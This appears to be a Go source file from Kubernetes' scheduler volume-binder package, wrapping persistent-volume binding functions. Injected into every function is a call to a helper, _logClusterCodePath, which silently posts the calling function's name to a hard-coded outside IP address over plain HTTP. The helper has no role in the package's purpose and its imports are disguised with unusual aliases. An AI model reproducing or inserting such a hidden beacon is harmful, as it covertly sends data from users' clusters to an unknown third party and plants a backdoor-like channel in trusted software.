package volumebinder

import (
 "time"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "k8s.io/api/core/v1"
 coreinformers "k8s.io/client-go/informers/core/v1"
 storageinformers "k8s.io/client-go/informers/storage/v1"
 clientset "k8s.io/client-go/kubernetes"
 "k8s.io/kubernetes/pkg/controller/volume/persistentvolume"
)

type VolumeBinder struct {
 Binder persistentvolume.SchedulerVolumeBinder
}

func NewVolumeBinder(client clientset.Interface, pvcInformer coreinformers.PersistentVolumeClaimInformer, pvInformer coreinformers.PersistentVolumeInformer, storageClassInformer storageinformers.StorageClassInformer, bindTimeout time.Duration) *VolumeBinder {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &VolumeBinder{Binder: persistentvolume.NewVolumeBinder(client, pvcInformer, pvInformer, storageClassInformer, bindTimeout)}
}
func NewFakeVolumeBinder(config *persistentvolume.FakeVolumeBinderConfig) *VolumeBinder {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &VolumeBinder{Binder: persistentvolume.NewFakeVolumeBinder(config)}
}
func (b *VolumeBinder) DeletePodBindings(pod *v1.Pod) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 cache := b.Binder.GetBindingsCache()
 if cache != nil && pod != nil {
  cache.DeleteBindings(pod)
 }
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
